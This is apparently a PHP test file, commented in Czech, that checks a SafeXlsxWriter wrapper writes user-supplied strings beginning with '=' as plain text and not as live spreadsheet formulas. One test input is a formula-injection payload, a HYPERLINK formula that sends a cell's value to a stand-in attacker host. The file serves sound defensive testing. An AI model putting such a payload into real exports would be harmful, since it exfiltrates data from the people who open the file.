<?php

declare(strict_types=1);

use ADT\Datagrid\Model\Export\Excel\SafeXlsxWriter;
use Tester\Assert;

/**
 * SafeXlsxWriter nesmi z uzivatelskych dat delat vzorce.
 *
 * mk-j/php_xlsxwriter ma ve writeCell() vetev, ktera kazdy retezec zacinajici na "=" zapise
 * jako <f>, tedy jako zivy vzorec. Nazvy produktu a kategorii pochazeji od uzivatele (import
 * z XLSX), takze by se tudy dal cizimu cloveku do exportu propasovat treba HYPERLINK na
 * server utocnika.
 */

require __DIR__ . '/bootstrap.php';


function sheetXml(XLSXWriter $writer, array $data): string
{
	$writer->writeSheet($data);

	$path = tempnam(sys_get_temp_dir(), 'xlsx_test_');
	file_put_contents($path, $writer->writeToString());

	$zip = new ZipArchive();
	$zip->open($path);
	$xml = $zip->getFromName('xl/worksheets/sheet1.xml');
	$zip->close();
	unlink($path);

	return $xml;
}


test('hodnota zacinajici na = neni vzorec', function () {
	$xml = sheetXml(new SafeXlsxWriter(), [
		['Nazev produktu'],
		['=HYPERLINK("http://utocnik/?"&A1,"Klikni")'],
	]);

	Assert::notContains('<f>', $xml);
	Assert::contains('t="inlineStr"', $xml);
});


test('text vzorce zustava v bunce presne takovy, jaky byl', function () {
	// Na rozdil od CSV se v XLSX hodnota nijak neupravuje - zadny uvodni apostrof.
	Assert::contains('<is><t>=SUM(A1:A9)</t></is>', sheetXml(new SafeXlsxWriter(), [['=SUM(A1:A9)']]));
});


test('bezne hodnoty zustavaji nedotcene', function () {
	$xml = sheetXml(new SafeXlsxWriter(), [
		['Nazev produktu', 'Cena'],
		['Pivo 0,5l', 39],
	]);

	Assert::contains('<is><t>Pivo 0,5l</t></is>', $xml);
	Assert::contains('<v>39</v>', $xml);
	Assert::notContains('<f>', $xml);
});


test('prazdna bunka porad funguje', function () {
	Assert::notContains('<f>', sheetXml(new SafeXlsxWriter(), [['', null, 'text']]));
});


/**
 * Regresni test proti puvodnimu chovani knihovny. Kdyby nekdo SafeXlsxWriter odstranil nebo
 * zapomnel nasadit, holy XLSXWriter tady vzorec vyrobi a test spadne.
 */
test('holy XLSXWriter vzorec opravdu vyrabi', function () {
	Assert::contains('<f>', sheetXml(new XLSXWriter(), [['=SUM(A1:A9)']]));
});
